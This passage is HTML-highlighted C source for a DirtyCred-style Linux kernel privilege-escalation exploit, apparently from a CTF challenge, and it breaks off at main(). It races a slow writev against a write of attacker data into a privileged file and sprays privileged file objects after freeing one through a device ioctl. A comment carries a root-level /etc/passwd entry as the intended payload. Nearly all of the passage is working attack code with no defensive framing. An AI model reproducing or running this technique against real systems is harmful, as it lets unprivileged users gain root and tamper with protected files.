</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="p">{</span><span class="s">&#34;/proc/sys/kernel/sem&#34;</span><span class="p">,</span> <span class="s">&#34;1024 1048576 500 1024&#34;</span><span class="p">},</span> <span class="c1">// 每个信号集中的最大信号量数目; 系统范围内的最大信号量总数目; 每个信号发生时的最大系统操作数目; 系统范围内的最大信号集总数目
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="p">};</span>
</span></span><span class="line"><span class="cl">  <span class="c1">// unsigned i;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="c1">// for (i = 0; i &lt; sizeof(sysctls) / sizeof(sysctls[0]); i++)
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="c1">//   write_file(sysctls[i].name, sysctls[i].value);
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">static</span> <span class="kt">int</span> <span class="nf">wait_for_loop</span><span class="p">(</span><span class="kt">int</span> <span class="n">pid</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="n">pid</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nf">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="kt">int</span> <span class="n">status</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="k">while</span> <span class="p">(</span><span class="nf">waitpid</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">status</span><span class="p">,</span> <span class="n">__WALL</span><span class="p">)</span> <span class="o">!=</span> <span class="n">pid</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="nf">WEXITSTATUS</span><span class="p">(</span><span class="n">status</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">static</span> <span class="kt">int</span> <span class="n">real_uid</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">static</span> <span class="kt">int</span> <span class="n">real_gid</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nf">__attribute__</span><span class="p">((</span><span class="nf">aligned</span><span class="p">(</span><span class="mi">64</span> <span class="o">&lt;&lt;</span> <span class="mi">10</span><span class="p">)))</span> <span class="k">static</span> <span class="kt">char</span> <span class="n">sandbox_stack</span><span class="p">[</span><span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="mi">20</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="c1">// sub-process
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">static</span> <span class="kt">int</span> <span class="nf">namespace_sandbox_proc</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="c1">// sandbox_common();     // setup sub-process parameter (memory / namespace / msg)
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="nf">loop</span><span class="p">();</span>               <span class="c1">// main exploit
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="c1">// create sub-process to escalate privilege and check whether the &#34;/etc/passwd&#34; is changed
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">static</span> <span class="kt">int</span> <span class="nf">do_sandbox_namespace</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="nf">setup_common</span><span class="p">();</span>       <span class="c1">// no use
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="n">real_uid</span> <span class="o">=</span> <span class="nf">getuid</span><span class="p">();</span>  <span class="c1">// no use
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="n">real_gid</span> <span class="o">=</span> <span class="nf">getgid</span><span class="p">();</span>  <span class="c1">// no use
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="nf">mprotect</span><span class="p">(</span><span class="n">sandbox_stack</span><span class="p">,</span> <span class="mi">4096</span><span class="p">,</span> <span class="n">PROT_NONE</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="k">while</span> <span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">pid</span> <span class="o">=</span> <span class="nf">clone</span><span class="p">(</span><span class="n">loop</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">sandbox_stack</span><span class="p">[</span><span class="k">sizeof</span><span class="p">(</span><span class="n">sandbox_stack</span><span class="p">)</span> <span class="o">-</span> <span class="mi">64</span><span class="p">],</span>
</span></span><span class="line"><span class="cl">              <span class="n">CLONE_NEWUSER</span> <span class="o">|</span> <span class="n">CLONE_NEWPID</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">ret_status</span> <span class="o">=</span> <span class="nf">wait_for_loop</span><span class="p">(</span><span class="n">pid</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">ret_status</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[!] succeed</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="nf">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[*] checking /happy</span><span class="se">\n\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[*] executing command : head -n 5 /happy</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="nf">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="nf">system</span><span class="p">(</span><span class="s">&#34;head -n 5 /happy&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[-] failed to write, retry...</span><span class="se">\n\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="nf">sleep</span><span class="p">(</span><span class="mi">3</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// ===========================
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl"><span class="cp">#ifndef __NR_fsconfig
</span></span></span><span class="line"><span class="cl"><span class="cp">#define __NR_fsconfig 431
</span></span></span><span class="line"><span class="cl"><span class="cp">#endif
</span></span></span><span class="line"><span class="cl"><span class="cp">#ifndef __NR_fsopen
</span></span></span><span class="line"><span class="cl"><span class="cp">#define __NR_fsopen 430
</span></span></span><span class="line"><span class="cl"><span class="cp">#endif
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl"><span class="cp">#define MAX_FILE_NUM 1000
</span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="kt">int</span> <span class="n">uaf_fd</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="n">fds</span><span class="p">[</span><span class="n">MAX_FILE_NUM</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="n">run_write</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>  <span class="c1">// make thread 1 get lock first, then thread 2
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kt">int</span> <span class="n">run_spray</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>  <span class="c1">// make thread 2 allocate unprivileged object first, then thread 3
</span></span></span><span class="line"><span class="cl"><span class="c1">// slow_write() —— thread 1: occupy the write lock, and write plenty of data
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kt">void</span> <span class="o">*</span><span class="nf">slow_write</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[*] start slow write to get the lock %d</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span><span class="n">uaf_fd</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="kt">int</span> <span class="n">fd</span> <span class="o">=</span> <span class="nf">open</span><span class="p">(</span><span class="s">&#34;./uaf&#34;</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="n">fd</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nf">perror</span><span class="p">(</span><span class="s">&#34;error open uaf file&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="kt">unsigned</span> <span class="kt">long</span> <span class="kt">int</span> <span class="n">addr</span> <span class="o">=</span> <span class="mh">0x30000000</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="kt">int</span> <span class="n">offset</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="k">for</span> <span class="p">(</span><span class="n">offset</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">offset</span> <span class="o">&lt;</span> <span class="mh">0x80000</span><span class="p">;</span> <span class="n">offset</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kt">void</span> <span class="o">*</span><span class="n">r</span> <span class="o">=</span> <span class="nf">mmap</span><span class="p">((</span><span class="kt">void</span> <span class="o">*</span><span class="p">)(</span><span class="n">addr</span> <span class="o">+</span> <span class="n">offset</span> <span class="o">*</span> <span class="mh">0x1000</span><span class="p">),</span> <span class="mh">0x1000</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                   <span class="n">PROT_READ</span> <span class="o">|</span> <span class="n">PROT_WRITE</span><span class="p">,</span> <span class="n">MAP_PRIVATE</span> <span class="o">|</span> <span class="n">MAP_ANONYMOUS</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">r</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> 
</span></span><span class="line"><span class="cl">      <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;allocate failed at 0x%x</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">offset</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="nf">assert</span><span class="p">(</span><span class="n">offset</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="kt">void</span> <span class="o">*</span><span class="n">mem</span> <span class="o">=</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)(</span><span class="n">addr</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">memcpy</span><span class="p">(</span><span class="n">mem</span><span class="p">,</span> <span class="s">&#34;hhhhh&#34;</span><span class="p">,</span> <span class="mi">5</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="c1">// send 5 write address to trigger writev (vector write), that can be blocked
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="k">struct</span> <span class="n">iovec</span> <span class="n">iov</span><span class="p">[</span><span class="mi">5</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">  <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">5</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">iov</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">iov_base</span> <span class="o">=</span> <span class="n">mem</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">iov</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">iov_len</span> <span class="o">=</span> <span class="p">(</span><span class="n">offset</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span> <span class="o">*</span> <span class="mh">0x1000</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="n">run_write</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>    <span class="c1">// thread 2 can begin
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="k">if</span> <span class="p">(</span><span class="nf">writev</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">iov</span><span class="p">,</span> <span class="mi">5</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nf">perror</span><span class="p">(</span><span class="s">&#34;slow write&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[*] slow write done!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="c1">// write_cmd() —— thread 2: write evil data to the privileged file
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kt">void</span> <span class="o">*</span><span class="nf">write_cmd</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kt">char</span> <span class="n">data</span><span class="p">[</span><span class="mi">1024</span><span class="p">]</span> <span class="o">=</span> <span class="s">&#34;/flag</span><span class="se">\x00\x00\x00</span><span class="s">&#34;</span><span class="p">;</span>     <span class="c1">// hacker❌0:0:root:/:/bin/sh    \nDirtyCred works!\n\n   
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="k">struct</span> <span class="n">iovec</span> <span class="n">iov</span> <span class="o">=</span> <span class="p">{.</span><span class="n">iov_base</span> <span class="o">=</span> <span class="n">data</span><span class="p">,</span> <span class="p">.</span><span class="n">iov_len</span> <span class="o">=</span> <span class="mi">8</span><span class="p">};</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="k">while</span> <span class="p">(</span><span class="o">!</span><span class="n">run_write</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// printf(&#34;run_wriet:%d:\n&#34;,run_write);
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="n">run_spray</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>   <span class="c1">// thread 3 can begin
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="k">if</span> <span class="p">(</span><span class="nf">writev</span><span class="p">(</span><span class="n">uaf_fd</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">iov</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="nf">perror</span><span class="p">(</span><span class="s">&#34;writev&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[*] write_cmd done! It should be after the slow write</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="c1">// spray_files() —— thread 3: spray high privileged file object
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kt">int</span> <span class="n">fs_fd</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="n">tmp_fd</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">spray_files</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">while</span> <span class="p">(</span><span class="o">!</span><span class="n">run_spray</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="c1">// printf(&#34;run_spray:%d:\n&#34;,run_spray);
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="n">fs_fd</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">      <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;ERROR&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[*] free uaf file struct</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">ioctl</span><span class="p">(</span><span class="n">fs_fd</span><span class="p">,</span><span class="mh">0x5555</span><span class="p">,</span><span class="n">uaf_fd</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">ioctl</span><span class="p">(</span><span class="n">fs_fd</span><span class="p">,</span><span class="mh">0x6666</span><span class="p">,</span><span class="n">uaf_fd</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// getchar();
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">// while(close(uaf_fd) &gt;= 0){
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">//     printf(&#34;[+] close uaf_fd\n&#34;);
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">// }
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">found</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// spray priviledged file object
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[*] uaf fd %d, start spray....</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">uaf_fd</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// getchar();
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span> <span class="p">;</span><span class="n">i</span> <span class="o">&lt;</span> <span class="mh">0x10</span><span class="p">;</span><span class="n">i</span><span class="o">++</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">      <span class="n">fds</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="nf">open</span><span class="p">(</span><span class="s">&#34;/happy&#34;</span><span class="p">,</span> <span class="n">O_RDONLY</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span><span class="nf">syscall</span><span class="p">(</span><span class="n">__NR_kcmp</span><span class="p">,</span> <span class="nf">getpid</span><span class="p">(),</span> <span class="nf">getpid</span><span class="p">(),</span> <span class="n">KCMP_FILE</span><span class="p">,</span> <span class="n">tmp_fd</span><span class="p">,</span> <span class="n">fds</span><span class="p">[</span><span class="n">i</span><span class="p">])</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="n">found</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[!] found, file id %d %d</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span><span class="n">fds</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// for (int i = 0; i &lt; 1000; i++) {
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">//     fds[i] = open(&#34;/happy&#34;, O_RDONLY);
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">//     if (fds[i] &lt; 0) {
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">//         perror(&#34;open file&#34;);
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">//         printf(&#34;%d\n&#34;, i);
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">//     }  // kcmp - 确定两个已经打开的文件描述符（可能来自不同的进程）是否指向内核中的同一个已打开的文件
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">//         // int kcmp(pid_t pid1, pid_t pid2, int type, unsigned long idx1, unsigned long idx2);
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">//         // 若为同一文件，则表示 file 对象已成功替换
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">//     if (syscall(__NR_kcmp, getpid(), getpid(), KCMP_FILE, tmp_fd, fds[i]) == 0) {
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">//         found = 1;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">//         printf(&#34;[!] found, file id %d %d\n&#34;, i,fds[i]);
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">//         for (int j = 0; j &lt; i; j++)
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">//             close(fds[j]);
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">//         break;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">//     }
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">// }
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">    <span class="c1">// if (found) {
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">//     sleep(3);
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">//     return 0;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">// }
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="c1">// trigger() —— trigger UAF to free the unprivileged file object
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kt">void</span> <span class="nf">trigger</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="c1">//   int fs_fd = syscall(__NR_fsopen, &#34;cgroup&#34;, 0);
</span></span></span><span class="line"><span class="cl"><span class="c1">//   if (fs_fd &lt; 0) {
</span></span></span><span class="line"><span class="cl"><span class="c1">//     perror(&#34;fsopen&#34;);
</span></span></span><span class="line"><span class="cl"><span class="c1">//     die(&#34;&#34;);
</span></span></span><span class="line"><span class="cl"><span class="c1">//   }
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">  <span class="nf">symlink</span><span class="p">(</span><span class="s">&#34;./data&#34;</span><span class="p">,</span> <span class="s">&#34;./uaf&#34;</span><span class="p">);</span>   <span class="c1">// symbol link ./uaf -&gt; ./data, to avoid the lock in __fdget_pos() before permission check
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl"><span class="c1">//   uaf_fd = open(&#34;./uaf&#34;, 1);
</span></span></span><span class="line"><span class="cl"><span class="c1">//   if (uaf_fd &lt; 0) 
</span></span></span><span class="line"><span class="cl"><span class="c1">//     die(&#34;failed to open symbolic file\n&#34;);
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl"><span class="c1">//   if (syscall(__NR_fsconfig, fs_fd, 5, &#34;source&#34;, 0, uaf_fd)) {      // FSCONFIG_SET_FD = 5
</span></span></span><span class="line"><span class="cl"><span class="c1">//     perror(&#34;fsconfig&#34;);
</span></span></span><span class="line"><span class="cl"><span class="c1">//     exit(-1);
</span></span></span><span class="line"><span class="cl"><span class="c1">//   }
</span></span></span><span class="line"><span class="cl"><span class="c1">//   // free the uaf fd
</span></span></span><span class="line"><span class="cl"><span class="c1">//   close(fs_fd);
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">fs_fd</span> <span class="o">=</span> <span class="nf">open</span><span class="p">(</span><span class="s">&#34;/dev/fileManager&#34;</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="n">fs_fd</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="nf">perror</span><span class="p">(</span><span class="s">&#34;open&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="n">uaf_fd</span> <span class="o">=</span> <span class="nf">open</span><span class="p">(</span><span class="s">&#34;./uaf&#34;</span><span class="p">,</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">uaf_fd</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> 
</span></span><span class="line"><span class="cl">        <span class="nf">die</span><span class="p">(</span><span class="s">&#34;failed to open symbolic file</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">tmp_fd</span> <span class="o">=</span> <span class="n">uaf_fd</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="c1">// loop() —— main exploit
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kt">void</span> <span class="nf">loop</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="nf">trigger</span><span class="p">();</span>                                        <span class="c1">// trigger UAF to free the unprivileged file object
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">  <span class="kt">pthread_t</span> <span class="n">p_id</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="nf">pthread_create</span><span class="p">(</span><span class="o">&amp;</span><span class="n">p_id</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">slow_write</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>    <span class="c1">// thread 1: occupy the write lock 
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">  <span class="kt">pthread_t</span> <span class="n">p_id_cmd</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="nf">pthread_create</span><span class="p">(</span><span class="o">&amp;</span><span class="n">p_id_cmd</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">write_cmd</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span> <span class="c1">// thread 2: wait for the write lock to an unprivileged file 
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="nf">spray_files</span><span class="p">();</span>                              <span class="c1">// thread 3: spray high privileged file object
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="nf">pthread_join</span><span class="p">(</span><span class="n">p_id</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">pthread_join</span><span class="p">(</span><span class="n">p_id_cmd</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
